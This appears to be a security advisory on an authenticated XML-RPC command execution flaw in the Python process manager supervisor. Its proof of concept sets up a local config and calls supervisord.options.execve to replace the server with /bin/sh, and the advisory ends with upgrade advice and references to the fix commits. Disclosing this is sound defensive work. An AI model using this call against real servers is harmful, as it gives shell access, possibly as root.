## Overview
[`supervisor`](https://pypi.python.org/pypi/supervisor/) is a client/server system that allows its users to monitor and control a number of processes on UNIX-like operating systems.

Affected versions of the package are vulnerable to Arbitrary Command Execution. A vulnerability has been found where an authenticated client can send a malicious XML-RPC request to `supervisord` that will run arbitrary shell commands on the server. The commands will be run as the same user as `supervisord`. Depending on how `supervisord` has been configured, this may be root.

## Details
* `supervisord` is the server component and is responsible for starting child processes, responding to commands from clients, and other commands.
* `supervisorctl` is the command line component, providing a shell-like interface to the features provided by `supervisord`.

`supervisord` can be configured to run an HTTP server on a TCP socket and/or a Unix domain socket. This HTTP server is how `supervisorctl` communicates with `supervisord`. If an HTTP server has been enabled, it will always serve both HTML pages and an XML-RPC interface. A vulnerability has been found where an authenticated client can send a malicious XML-RPC request to `supervisord` that will run arbitrary shell commands on the server. The commands will be run as the same user as `supervisord`. Depending on how `supervisord` has been configured, this may be root.
This vulnerability can only be exploited by an authenticated client or if `supervisord` has been configured to run an HTTP server without authentication. If authentication has not been enabled, `supervisord` will log a message at the critical level every time it starts.

## PoC by Maor Shwartz

Create a config file `supervisord.conf`:

```conf
[supervisord]
loglevel = trace

[inet_http_server]
port = 127.0.0.1:9001

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface
```

Start supervisord in the foreground with that config file:

```
$ supervisord -n -c supervisord.conf
```

In a new terminal:

```py
$ python2
>>> from xmlrpclib import ServerProxy
>>> server = ServerProxy('http://127.0.0.1:9001/RPC2')
>>> server.supervisor.supervisord.options.execve('/bin/sh', [], {})
  ```

If the `supervisord` version is vulnerable, the `execve` will be executed and the `supervisord` process will be replaced with /bin/sh (or any other command given). If the `supervisord` version is not vulnerable, it will return an `UNKNOWN_METHOD` fault.


## Remediation
Upgrade `supervisor` to version 3.3.3 or higher.

## References
- [Github Issue](https://github.com/Supervisor/supervisor/issues/964)
- [Github Commit 3.0.1](https://github.com/Supervisor/supervisor/commit/83060f3383ebd26add094398174f1de34cf7b7f0)
- [Github Commit 3.1.4](https://github.com/Supervisor/supervisor/commit/dbe0f55871a122eac75760aef511efc3a8830b88)
- [Github Commit 3.2.4](https://github.com/Supervisor/supervisor/commit/aac3c21893cab7361f5c35c8e20341b298f6462e)
- [Github Commit 3.3.3](https://github.com/Supervisor/supervisor/commit/058f46141e346b18dee0497ba11203cb81ecb19e)
